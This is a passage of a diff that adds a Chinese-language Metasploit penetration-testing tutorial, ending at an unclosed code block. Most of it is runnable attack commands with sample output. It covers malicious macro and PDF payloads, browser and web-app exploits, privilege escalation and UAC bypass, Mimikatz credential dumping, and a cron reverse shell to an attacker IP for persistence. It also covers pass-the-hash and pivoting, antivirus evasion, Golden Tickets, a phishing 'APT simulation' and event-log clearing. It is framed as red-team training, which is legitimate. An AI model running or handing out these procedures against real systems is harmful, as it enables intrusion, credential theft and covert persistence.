@@ -919,3 +919,1396 @@ msf6 exploit(...) > exploit
 # 将生成的 URL 发送给目标用户
 # 当用户访问并运行 HTA 文件时，将获得 Meterpreter 会话
 ```
+
+#### 5.1.3 生成恶意 Office 宏文档
+
+```bash
+# 步骤 1：使用 msfvenom 生成 VBA 宏代码
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba
+
+# 步骤 2：将生成的代码复制到 Word/Excel 宏中
+# 1. 打开 Word/Excel
+# 2. 按 Alt+F11 打开 VBA 编辑器
+# 3. 插入新模块，粘贴代码
+# 4. 保存为 .docm 或 .xlsm 格式
+
+# 步骤 3：设置监听器
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > exploit -j
+
+# 当目标用户打开文档并启用宏时，将获得会话
+```
+
+#### 5.1.4 生成恶意 PDF 文件
+
+```bash
+# 使用 Adobe PDF 嵌入式 EXE 漏洞
+msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > set FILENAME malicious.pdf
+msf6 exploit(...) > exploit
+
+# 输出：
+# [*] Creating 'malicious.pdf' file...
+# [+] malicious.pdf stored at /root/.msf4/local/malicious.pdf
+```
+
+### 5.2 项目十四：浏览器漏洞利用
+
+**目标**：利用浏览器漏洞获取访问恶意网页的用户系统控制权。
+
+**难度**：★★★★☆
+
+#### 5.2.1 实践步骤
+
+```bash
+# 步骤 1：搜索浏览器漏洞模块
+msf6 > search type:exploit browser
+
+# 步骤 2：使用 browser_autopwn2 自动化攻击
+msf6 > use auxiliary/server/browser_autopwn2
+msf6 auxiliary(server/browser_autopwn2) > set LHOST 192.168.1.50
+msf6 auxiliary(...) > set SRVPORT 8080
+msf6 auxiliary(...) > set URIPATH /
+msf6 auxiliary(...) > run
+
+# 输出：
+# [*] Starting exploit modules on host 192.168.1.50...
+# [*] ---
+# [*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload firefox/shell_reverse_tcp
+# [*] Using URL: http://192.168.1.50:8080/
+# ...
+
+# 将 URL 发送给目标用户，当他们访问时会自动尝试各种浏览器漏洞
+```
+
+### 5.3 项目十五：Web 应用漏洞利用
+
+**目标**：利用常见 Web 应用漏洞获取服务器控制权。
+
+**难度**：★★★★☆
+
+#### 5.3.1 Struts2 远程代码执行
+
+```bash
+# CVE-2017-5638 (S2-045)
+msf6 > search struts2
+msf6 > use exploit/multi/http/struts2_content_type_ognl
+msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.1.100
+msf6 exploit(...) > set RPORT 8080
+msf6 exploit(...) > set TARGETURI /struts2-showcase/
+msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+```
+
+#### 5.3.2 Jenkins 脚本控制台利用
+
+```bash
+# 利用 Jenkins 脚本控制台执行代码
+msf6 > use exploit/multi/http/jenkins_script_console
+msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.1.100
+msf6 exploit(...) > set RPORT 8080
+msf6 exploit(...) > set TARGETURI /
+msf6 exploit(...) > set USERNAME admin
+msf6 exploit(...) > set PASSWORD admin
+msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+```
+
+#### 5.3.3 WordPress 漏洞利用
+
+```bash
+# 步骤 1：扫描 WordPress
+msf6 > use auxiliary/scanner/http/wordpress_scanner
+msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > run
+
+# 步骤 2：枚举 WordPress 用户
+msf6 > use auxiliary/scanner/http/wordpress_login_enum
+msf6 auxiliary(scanner/http/wordpress_login_enum) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > set TARGETURI /wordpress/
+msf6 auxiliary(...) > run
+
+# 步骤 3：利用插件漏洞
+msf6 > search wordpress type:exploit
+# 选择适合目标版本的漏洞模块
+```
+
+### 5.4 项目十六：Windows 本地权限提升
+
+**目标**：在已获得低权限 shell 的情况下，提升到 SYSTEM 权限。
+
+**难度**：★★★★☆
+
+#### 5.4.1 使用 getsystem 命令
+
+```bash
+# 在 Meterpreter 会话中
+meterpreter > getuid
+# Server username: VICTIM\user
+
+meterpreter > getsystem
+# ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+```
+
+#### 5.4.2 使用本地提权漏洞
+
+```bash
+# 步骤 1：查找本地提权漏洞
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# 输出示例：
+# [*] 192.168.1.101 - Collecting local exploits for x64/windows...
+# [*] 192.168.1.101 - 37 exploit checks are being tried...
+# [+] 192.168.1.101 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+# [+] 192.168.1.101 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
+
+# 步骤 2：使用建议的漏洞模块
+meterpreter > background
+msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 5555
+msf6 exploit(...) > exploit
+
+# 成功后获得 SYSTEM 权限的新会话
+```
+
+#### 5.4.3 绕过 UAC
+
+```bash
+# 方法 1：使用 bypassuac 模块
+msf6 > use exploit/windows/local/bypassuac
+msf6 exploit(windows/local/bypassuac) > set SESSION 1
+msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 5555
+msf6 exploit(...) > exploit
+
+# 方法 2：使用 bypassuac_eventvwr
+msf6 > use exploit/windows/local/bypassuac_eventvwr
+msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > exploit
+
+# 方法 3：使用 bypassuac_fodhelper
+msf6 > use exploit/windows/local/bypassuac_fodhelper
+msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > exploit
+```
+
+### 5.5 项目十七：Linux 本地权限提升
+
+**目标**：在已获得低权限 shell 的情况下，提升到 root 权限。
+
+**难度**：★★★★☆
+
+#### 5.5.1 使用本地提权漏洞建议器
+
+```bash
+# 在 Meterpreter 会话中
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# 或者使用专门的 Linux 模块
+meterpreter > background
+msf6 > use post/linux/gather/enum_system
+msf6 post(linux/gather/enum_system) > set SESSION 1
+msf6 post(...) > run
+```
+
+#### 5.5.2 常见 Linux 提权漏洞
+
+```bash
+# Dirty COW (CVE-2016-5195)
+msf6 > use exploit/linux/local/dirtycow
+msf6 exploit(linux/local/dirtycow) > set SESSION 1
+msf6 exploit(...) > exploit
+
+# PwnKit (CVE-2021-4034)
+msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > exploit
+
+# Sudo 漏洞 (CVE-2021-3156)
+msf6 > use exploit/linux/local/sudo_baron_samedit
+msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > exploit
+```
+
+### 5.6 项目十八：密码获取与哈希破解
+
+**目标**：从目标系统获取密码哈希并尝试破解。
+
+**难度**：★★★★☆
+
+#### 5.6.1 Windows 密码获取
+
+```bash
+# 方法 1：使用 hashdump
+meterpreter > hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# user:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+
+# 方法 2：使用 Kiwi (Mimikatz)
+meterpreter > load kiwi
+meterpreter > creds_all
+
+# 输出示例：
+# [+] Running as SYSTEM
+# [*] Retrieving all credentials
+# msv credentials
+# ===============
+# Username  Domain   LM                                NTLM                              SHA1
+# --------  ------   --                                ----                              ----
+# user      VICTIM   aad3b435b51404eeaad3b435b51404ee  e19ccf75ee54e06b06a5907af13cef42  ...
+
+# wdigest credentials
+# ===================
+# Username  Domain   Password
+# --------  ------   --------
+# user      VICTIM   Password123!
+
+# 方法 3：导出 SAM 和 SYSTEM 文件
+meterpreter > run post/windows/gather/smart_hashdump
+```
+
+#### 5.6.2 Linux 密码获取
+
+```bash
+# 获取 /etc/shadow 文件
+meterpreter > cat /etc/shadow
+
+# 或使用后渗透模块
+meterpreter > run post/linux/gather/hashdump
+
+# 输出示例：
+# root:$6$xxxxx$yyyyy:18000:0:99999:7:::
+# user:$6$aaaaa$bbbbb:18000:0:99999:7:::
+```
+
+#### 5.6.3 使用 John the Ripper 破解哈希
+
+```bash
+# 保存哈希到文件
+echo "user:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::" > hashes.txt
+
+# 使用 John 破解
+john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# 查看破解结果
+john --show hashes.txt
+```
+
+---
+
+## 6. 专家级实践项目
+
+这一部分的项目涉及高级攻击技术，包括持久化、横向移动和免杀技术。
+
+### 6.1 项目十九：持久化访问
+
+**目标**：在目标系统上建立持久化后门，确保重启后仍能访问。
+
+**难度**：★★★★★
+
+#### 6.1.1 Windows 持久化
+
+```bash
+# 方法 1：使用 persistence 脚本
+meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.50
+
+# 参数说明：
+# -U: 用户登录时启动
+# -i 60: 每 60 秒尝试连接
+# -p 4444: 连接端口
+# -r: 攻击者 IP
+
+# 方法 2：使用注册表持久化
+meterpreter > run post/windows/manage/persistence_exe
+# 或
+msf6 > use exploit/windows/local/persistence
+msf6 exploit(windows/local/persistence) > set SESSION 1
+msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > set STARTUP SYSTEM
+msf6 exploit(...) > exploit
+
+# 方法 3：使用计划任务
+meterpreter > run post/windows/manage/persistence_exe STARTUP=TASK
+```
+
+#### 6.1.2 Linux 持久化
+
+```bash
+# 方法 1：SSH 密钥持久化
+meterpreter > run post/linux/manage/sshkey_persistence
+
+# 方法 2：Cron 任务持久化
+meterpreter > shell
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" >> /var/spool/cron/crontabs/root
+
+# 方法 3：使用后渗透模块
+msf6 > use exploit/linux/local/service_persistence
+msf6 exploit(linux/local/service_persistence) > set SESSION 1
+msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+```
+
+### 6.2 项目二十：横向移动
+
+**目标**：从已控制的系统移动到网络中的其他系统。
+
+**难度**：★★★★★
+
+#### 6.2.1 使用 Pass-the-Hash 攻击
+
+```bash
+# 步骤 1：获取目标系统的哈希
+meterpreter > hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+# 步骤 2：使用 psexec 模块进行 Pass-the-Hash
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.102
+msf6 exploit(...) > set SMBUser Administrator
+msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+```
+
+#### 6.2.2 使用 WMI 横向移动
+
+```bash
+msf6 > use exploit/windows/local/wmi
+msf6 exploit(windows/local/wmi) > set RHOSTS 192.168.1.102
+msf6 exploit(...) > set SMBUser Administrator
+msf6 exploit(...) > set SMBPass Password123!
+msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+```
+
+#### 6.2.3 使用 Meterpreter 进行网络枢纽
+
+```bash
+# 步骤 1：在已控制的系统上添加路由
+meterpreter > run autoroute -s 10.0.0.0/24
+
+# 或使用 post 模块
+meterpreter > background
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+msf6 post(...) > set SUBNET 10.0.0.0
+msf6 post(...) > set NETMASK /24
+msf6 post(...) > run
+
+# 步骤 2：设置 SOCKS 代理
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
+msf6 auxiliary(...) > set VERSION 4a
+msf6 auxiliary(...) > run -j
+
+# 步骤 3：配置 proxychains
+# 编辑 /etc/proxychains.conf
+# socks4 127.0.0.1 1080
+
+# 步骤 4：通过代理扫描内网
+proxychains nmap -sT -Pn 10.0.0.0/24
+
+# 步骤 5：通过代理攻击内网目标
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(...) > set RHOSTS 10.0.0.100
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp
+msf6 exploit(...) > exploit
+```
+
+#### 6.2.4 横向移动流程图
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                      横向移动攻击流程                           │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│   外网                    DMZ                    内网           │
+│                                                                 │
+│   ┌─────────┐         ┌─────────┐         ┌─────────┐          │
+│   │ 攻击者  │────────►│ Web服务器│────────►│ 数据库  │          │
+│   │         │  漏洞   │ (已控制) │  横向   │ 服务器  │          │
+│   └─────────┘  利用   └─────────┘  移动   └─────────┘          │
+│                            │                    │               │
+│                            │ 添加路由           │               │
+│                            ▼                    ▼               │
+│                       ┌─────────┐         ┌─────────┐          │
+│                       │ 域控制器│◄────────│ 文件    │          │
+│                       │         │  凭证   │ 服务器  │          │
+│                       └─────────┘  传递   └─────────┘          │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### 6.3 项目二十一：免杀技术
+
+**目标**：生成能够绑过杀毒软件检测的 Payload。
+
+**难度**：★★★★★
+
+#### 6.3.1 使用 MSFvenom 编码
+
+```bash
+# 基础编码
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
+
+# 参数说明：
+# -e: 编码器
+# -i: 编码迭代次数
+# -f: 输出格式
+
+# 多重编码
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -e x86/shikata_ga_nai -i 5 \
+    -e x86/countdown -i 3 \
+    -e x86/call4_dword_xor -i 2 \
+    -f exe > payload_multi.exe
+```
+
+#### 6.3.2 使用模板注入
+
+```bash
+# 将 Payload 注入到合法程序中
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -x /path/to/legitimate.exe \
+    -k \
+    -f exe > injected.exe
+
+# 参数说明：
+# -x: 模板文件
+# -k: 保持模板功能
+```
+
+#### 6.3.3 使用 Evasion 模块
+
+```bash
+# Metasploit 6.x 引入了 Evasion 模块
+msf6 > use evasion/windows/windows_defender_exe
+msf6 evasion(windows/windows_defender_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 evasion(...) > set LHOST 192.168.1.50
+msf6 evasion(...) > set LPORT 4444
+msf6 evasion(...) > set FILENAME defender_bypass.exe
+msf6 evasion(...) > run
+
+# 查看所有 Evasion 模块
+msf6 > show evasion
+```
+
+#### 6.3.4 使用 Shellcode 注入
+
+```bash
+# 生成原始 Shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -f c > shellcode.c
+
+# 生成 Python 格式
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -f python > shellcode.py
+
+# 生成 PowerShell 格式
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -f psh > shellcode.ps1
+
+# 然后使用自定义加载器执行 Shellcode
+```
+
+### 6.4 项目二十二：域渗透
+
+**目标**：在 Active Directory 环境中进行渗透测试。
+
+**难度**：★★★★★
+
+#### 6.4.1 域信息收集
+
+```bash
+# 在 Meterpreter 中收集域信息
+meterpreter > run post/windows/gather/enum_domain
+
+# 枚举域用户
+meterpreter > run post/windows/gather/enum_domain_users
+
+# 枚举域组
+meterpreter > run post/windows/gather/enum_domain_group_users
+
+# 枚举域控制器
+meterpreter > run post/windows/gather/enum_domain_controllers
+
+# 使用 PowerShell 收集信息
+meterpreter > load powershell
+meterpreter > powershell_execute "Get-ADDomain"
+meterpreter > powershell_execute "Get-ADUser -Filter *"
+```
+
+#### 6.4.2 Kerberos 攻击
+
+```bash
+# Kerberoasting - 获取服务账户的 TGS 票据
+meterpreter > load kiwi
+meterpreter > kerberos_ticket_list
+
+# 使用 post 模块
+msf6 > use post/windows/gather/kerberos_enumusers
+msf6 post(...) > set SESSION 1
+msf6 post(...) > run
+
+# 导出票据用于离线破解
+meterpreter > kiwi_cmd "kerberos::list /export"
+```
+
+#### 6.4.3 Golden Ticket 攻击
+
+```bash
+# 步骤 1：获取 krbtgt 账户的 NTLM 哈希
+meterpreter > load kiwi
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
+
+# 步骤 2：获取域 SID
+meterpreter > run post/windows/gather/enum_domain
+
+# 步骤 3：创建 Golden Ticket
+meterpreter > golden_ticket_create -d domain.local -u Administrator -s S-1-5-21-xxx -k <krbtgt_hash> -t /tmp/golden.kirbi
+
+# 步骤 4：使用 Golden Ticket
+meterpreter > kerberos_ticket_use /tmp/golden.kirbi
+```
+
+---
+
+## 7. 红队实战项目
+
+这一部分模拟真实的红队渗透测试场景，综合运用前面学到的所有技术。
+
+### 7.1 项目二十三：完整渗透测试流程
+
+**目标**：模拟完整的渗透测试流程，从信息收集到报告生成。
+
+**难度**：★★★★★
+
+#### 7.1.1 阶段一：信息收集
+
+```bash
+# 1. 创建工作区
+msf6 > workspace -a pentest_project
+
+# 2. 被动信息收集
+msf6 > use auxiliary/gather/search_email_collector
+msf6 auxiliary(...) > set DOMAIN target.com
+msf6 auxiliary(...) > run
+
+# 3. 主动扫描
+msf6 > db_nmap -sS -sV -O -A 192.168.1.0/24
+
+# 4. 查看收集的信息
+msf6 > hosts
+msf6 > services
+msf6 > vulns
+```
+
+#### 7.1.2 阶段二：漏洞分析
+
+```bash
+# 1. 运行漏洞扫描
+msf6 > vulns -R  # 显示所有漏洞
+
+# 2. 使用 autopwn 自动匹配漏洞
+msf6 > analyze
+
+# 3. 手动验证关键漏洞
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(...) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > run
+```
+
+#### 7.1.3 阶段三：漏洞利用
+
+```bash
+# 1. 选择最佳攻击路径
+# 2. 执行漏洞利用
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(...) > set RHOSTS 192.168.1.100
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > exploit
+
+# 3. 获得初始访问
+meterpreter > sysinfo
+meterpreter > getuid
+```
+
+#### 7.1.4 阶段四：后渗透
+
+```bash
+# 1. 权限提升
+meterpreter > getsystem
+
+# 2. 信息收集
+meterpreter > run post/windows/gather/enum_logged_on_users
+meterpreter > run post/windows/gather/enum_applications
+meterpreter > run post/windows/gather/enum_shares
+
+# 3. 凭证获取
+meterpreter > load kiwi
+meterpreter > creds_all
+
+# 4. 持久化
+meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.50
+
+# 5. 横向移动
+meterpreter > run autoroute -s 10.0.0.0/24
+```
+
+#### 7.1.5 阶段五：清理与报告
+
+```bash
+# 1. 清理痕迹
+meterpreter > clearev  # 清除事件日志
+
+# 2. 导出数据库
+msf6 > db_export -f xml pentest_report.xml
+
+# 3. 生成报告
+# 使用导出的数据生成渗透测试报告
+```
+
+### 7.2 项目二十四：APT 模拟攻击
+
+**目标**：模拟高级持续性威胁（APT）攻击场景。
+
+**难度**：★★★★★
+
+#### 7.2.1 攻击链概述
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                      APT 攻击链 (Kill Chain)                    │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│   1. 侦察 (Reconnaissance)                                      │
+│      └── 收集目标信息、员工邮箱、社交媒体                       │
+│                                                                 │
+│   2. 武器化 (Weaponization)                                     │
+│      └── 制作恶意文档、钓鱼邮件                                 │
+│                                                                 │
+│   3. 投递 (Delivery)                                            │
+│      └── 发送钓鱼邮件、水坑攻击                                 │
+│                                                                 │
+│   4. 利用 (Exploitation)                                        │
+│      └── 用户打开恶意文档，触发漏洞                             │
+│                                                                 │
+│   5. 安装 (Installation)                                        │
+│      └── 安装后门、建立持久化                                   │
+│                                                                 │
+│   6. 命令与控制 (C2)                                            │
+│      └── 建立隐蔽通信通道                                       │
+│                                                                 │
+│   7. 目标达成 (Actions on Objectives)                           │
+│      └── 数据窃取、横向移动、破坏                               │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+#### 7.2.2 实践步骤
+
+```bash
+# 阶段 1：制作钓鱼文档
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 \
+    -f vba-psh > macro.txt
+
+# 阶段 2：设置 HTTPS 监听器
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+msf6 exploit(...) > set LHOST 192.168.1.50
+msf6 exploit(...) > set LPORT 443
+msf6 exploit(...) > set ExitOnSession false
+msf6 exploit(...) > exploit -j
+
+# 阶段 3：等待目标上线后进行后渗透
+meterpreter > sysinfo
+meterpreter > getsystem
+meterpreter > load kiwi
+meterpreter > creds_all
+
+# 阶段 4：建立持久化
+meterpreter > run persistence -U -i 300 -p 443 -r 192.168.1.50
+
+# 阶段 5：横向移动到高价值目标
+meterpreter > run autoroute -s 10.0.0.0/24
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(...) > set RHOSTS 10.0.0.10
+msf6 exploit(...) > set SMBUser Administrator
+msf6 exploit(...) > set SMBPass <hash>
+msf6 exploit(...) > exploit
+```
+
+---
+
+## 8. 自动化与脚本开发
+
+### 8.1 资源脚本（RC Scripts）
+
+资源脚本是 Metasploit 的自动化利器，可以将一系列命令保存为脚本文件，实现自动化执行。
+
+#### 8.1.1 创建资源脚本
+
+```bash
+# 方法 1：手动创建
+# 创建文件 auto_scan.rc
+cat > auto_scan.rc << 'EOF'
+# 自动化扫描脚本
+workspace -a auto_scan
+db_nmap -sS -sV -O 192.168.1.0/24
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+hosts
+services
+vulns
+EOF
+
+# 方法 2：从命令历史创建
+msf6 > makerc /tmp/my_script.rc
+```
+
+#### 8.1.2 执行资源脚本
+
+```bash
+# 在 msfconsole 中执行
+msf6 > resource auto_scan.rc
+
+# 启动时执行
+msfconsole -r auto_scan.rc
+
+# 执行多个脚本
+msfconsole -r script1.rc -r script2.rc
+```
+
+#### 8.1.3 实用资源脚本示例
+
+```bash
+# 自动化漏洞利用脚本 (exploit_ms17010.rc)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target_ip>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+# 自动化后渗透脚本 (post_exploit.rc)
+# 在获得会话后执行
+sessions -i 1
+sysinfo
+getuid
+getsystem
+hashdump
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_applications
+background
+```
+
+### 8.2 使用 Ruby 编写自定义模块
+
+Metasploit 使用 Ruby 语言编写，你可以创建自定义模块来扩展其功能。
+
+#### 8.2.1 辅助模块模板
+
+```ruby
+# 保存到 ~/.msf4/modules/auxiliary/scanner/custom/my_scanner.rb
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'My Custom Scanner',
+      'Description'    => %q{
+        This is a custom scanner module example.
+      },
+      'Author'         => ['Your Name'],
+      'License'        => MSF_LICENSE
+    ))
+
+    register_options([
+      Opt::RPORT(80),
+      OptString.new('TARGETURI', [true, 'The target URI', '/'])
+    ])
+  end
+
+  def run_host(ip)
+    begin
+      connect
+      print_status("Connected to #{ip}:#{rport}")
+      
+      # 你的扫描逻辑
+      sock.put("GET #{datastore['TARGETURI']} HTTP/1.1\r\nHost: #{ip}\r\n\r\n")
+      response = sock.get_once
+      
+      if response && response.include?('200 OK')
+        print_good("#{ip}:#{rport} - Target is accessible")
+        report_host(host: ip)
+      end
+      
+      disconnect
+    rescue ::Rex::ConnectionError
+      print_error("#{ip}:#{rport} - Connection failed")
+    end
+  end
+end
+```
+
+#### 8.2.2 漏洞利用模块模板
+
+```ruby
+# 保存到 ~/.msf4/modules/exploits/custom/my_exploit.rb
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'My Custom Exploit',
+      'Description'    => %q{
+        This is a custom exploit module example.
+      },
+      'Author'         => ['Your Name'],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_X86,
+      'Targets'        => [
+        ['Linux x86', { 'Ret' => 0x08048000 }]
+      ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2024-01-01'
+    ))
+
+    register_options([
+      Opt::RPORT(9999)
+    ])
+  end
+
+  def check
+    # 检查目标是否存在漏洞
+    connect
+    banner = sock.get_once
+    disconnect
+    
+    if banner && banner.include?('Vulnerable Service')
+      return Exploit::CheckCode::Vulnerable
+    end
+    
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    connect
+    
+    # 构造漏洞利用数据
+    buffer = "A" * 100
+    buffer << [target.ret].pack('V')
+    buffer << payload.encoded
+    
+    print_status("Sending exploit...")
+    sock.put(buffer)
+    
+    handler
+    disconnect
+  end
+end
+```
+
+### 8.3 使用 Metasploit RPC API
+
+Metasploit 提供了 RPC API，可以通过编程方式控制 Metasploit。
+
+#### 8.3.1 启动 RPC 服务
+
+```bash
+# 启动 msfrpcd
+msfrpcd -P yourpassword -S -a 127.0.0.1
+
+# 参数说明：
+# -P: 密码
+# -S: 使用 SSL
+# -a: 监听地址
+```
+
+#### 8.3.2 Python 客户端示例
+
+```python
+#!/usr/bin/env python3
+# msf_client.py
+
+from pymetasploit3.msfrpc import MsfRpcClient
+
+# 连接到 Metasploit RPC
+client = MsfRpcClient('yourpassword', ssl=True)
+
+# 获取版本信息
+print(f"Metasploit Version: {client.core.version}")
+
+# 搜索模块
+modules = client.modules.search('ms17-010')
+for mod in modules:
+    print(f"Found: {mod['fullname']}")
+
+# 使用漏洞利用模块
+exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+exploit['RHOSTS'] = '192.168.1.100'
+exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
+exploit['LHOST'] = '192.168.1.50'
+exploit['LPORT'] = 4444
+
+# 执行漏洞利用
+result = exploit.execute()
+print(f"Job ID: {result['job_id']}")
+
+# 列出会话
+sessions = client.sessions.list
+for sid, session in sessions.items():
+    print(f"Session {sid}: {session['info']}")
+```
+
+---
+
+## 9. 常见错误与解决方案
+
+这一部分汇总了使用 Metasploit 过程中最常见的错误及其解决方案。
+
+### 9.1 数据库相关错误
+
+| 错误信息 | 原因 | 解决方案 |
+|----------|------|----------|
+| `Database not connected` | PostgreSQL 未启动或未配置 | `sudo msfdb init` 或 `sudo systemctl start postgresql` |
+| `could not connect to server` | 数据库服务未运行 | `sudo systemctl start postgresql` |
+| `FATAL: role "msf" does not exist` | 数据库用户未创建 | `sudo msfdb reinit` |
+| `database.yml not found` | 配置文件缺失 | `sudo msfdb init` |
+
+```bash
+# 数据库问题通用解决流程
+sudo systemctl stop postgresql
+sudo msfdb delete
+sudo msfdb init
+sudo systemctl start postgresql
+msfconsole
+msf6 > db_status
+```
+
+### 9.2 漏洞利用相关错误
+
+| 错误信息 | 原因 | 解决方案 |
+|----------|------|----------|
+| `Exploit completed, but no session was created` | 多种可能原因 | 见下方详细分析 |
+| `RHOSTS is not set` | 未设置目标主机 | `set RHOSTS <IP>` |
+| `LHOST is not set` | 未设置监听地址 | `set LHOST <IP>` |
+| `Handler failed to bind` | 端口被占用 | 更换 LPORT 或关闭占用进程 |
+| `Connection refused` | 目标端口未开放 | 确认目标服务运行 |
+| `Target is not vulnerable` | 目标已打补丁 | 尝试其他攻击向量 |
+
+#### 9.2.1 "No session created" 详细分析
+
+```bash
